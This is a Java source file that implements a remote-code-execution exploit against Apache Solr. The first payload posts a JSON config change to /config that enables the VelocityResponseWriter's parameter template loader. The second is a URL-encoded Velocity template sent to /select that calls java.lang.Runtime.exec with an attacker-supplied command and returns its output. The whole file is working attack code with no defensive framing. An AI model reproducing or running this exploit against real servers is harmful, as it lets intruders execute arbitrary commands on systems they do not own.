package exp;

import tools.HttpTool;

public class payload {
	public static String payload1 = "{\r\n" + 
			"  \"update-queryresponsewriter\": {\r\n" + 
			"    \"startup\": \"lazy\",\r\n" + 
			"    \"name\": \"velocity\",\r\n" + 
			"    \"class\": \"solr.VelocityResponseWriter\",\r\n" + 
			"    \"template.base.dir\": \"\",\r\n" + 
			"    \"solr.resource.loader.enabled\": \"true\",\r\n" + 
			"    \"params.resource.loader.enabled\": \"true\"\r\n" + 
			"  }\r\n" + 
			"}";
	
	public static String payload2 = "?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27shell%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end";
	
	String setConfig(String target)
	{
		String url = target + "/config";
		String re = new HttpTool().doPost(url, payload1, "application/json");
		return re;
	}
	
	String getShell(String target, String shell)
	{
		String shell2 = shell.replace(" ", "%20");
		String shell3 = shell2.replace("#", "%23");
		//String shell4 = shell3.replace("'", "%5C%27");
		String exp = payload2.replace("shell", shell3);
		String url = target + "/select" + exp;
		String re = new HttpTool().doGet(url);
		return re;
	}
	
	public static void main(String args[])
	{
		//String response;
	}

}
